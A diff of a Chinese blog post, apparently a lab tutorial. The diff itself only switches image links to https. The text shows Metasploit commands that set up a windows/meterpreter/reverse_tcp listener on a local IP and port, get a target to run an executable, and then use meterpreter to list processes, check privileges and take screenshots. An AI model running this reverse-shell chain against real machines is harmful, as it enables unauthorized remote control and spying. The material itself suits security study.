@@ -27,24 +27,24 @@ tags:
 
 打开终端，运行msf，`use exploit/multi/handler`选择exploit，`set payload windows/meterpreter/reverse_tcp`设置payload，`set LHOST 192.168.1.2`设置监听主机，`set LPORT 11101`设置端口
 
-![](http://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG)
+![](https://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG)
 
 输入`exploit -j`运行脚本，且在后台监听
 
 
 靶机双击桌面运行xx.exe，返回kali，已经取得会话
 
-![](http://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG)
+![](https://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG)
 
-![](http://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG)
+![](https://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG)
 
 敲击回车，返回msf，执行`sessions`，查看会话，再执行`sessions 1`,进入会话
 
-![](http://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG)
+![](https://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG)
 
 执行`ps`查看进程
 
-![](http://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG)
+![](https://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG)
 
 `getuid` 查看权限
 
@@ -52,14 +52,14 @@ tags:
 
 `screentshot`截图
 
-![](http://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG)
+![](https://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG)
 
 `background`会话转入后台
 
-![](http://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG)
+![](https://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG)
 
 新建终端，进入/root目录下，查看截图
 
-![](http://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG)
+![](https://121.5.125.62:88/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG)
 
 实验结束
